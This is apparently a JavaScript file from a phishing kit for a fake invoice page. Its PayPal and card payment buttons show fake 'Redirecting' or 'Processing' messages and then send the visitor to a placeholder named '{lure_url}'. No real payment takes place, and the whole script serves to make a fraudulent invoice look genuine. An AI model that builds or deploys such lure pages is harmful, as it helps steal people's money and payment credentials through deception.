function payWithPayPal() {
    const btn = document.querySelector('.btn-pay-paypal');
    btn.innerHTML = '<span>Redirecting to PayPal...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 2000);
}

function payWithCard() {
    const btn = document.querySelector('.btn-pay-card');
    btn.innerHTML = '<span>Processing...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1800);
}

document.addEventListener('DOMContentLoaded', () => {
    const card = document.querySelector('.invoice-content');
    card.style.opacity = '0';
    card.style.transform = 'translateY(30px)';
    
    setTimeout(() => {
        card.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
        card.style.opacity = '1';
        card.style.transform = 'translateY(0)';
    }, 150);
});
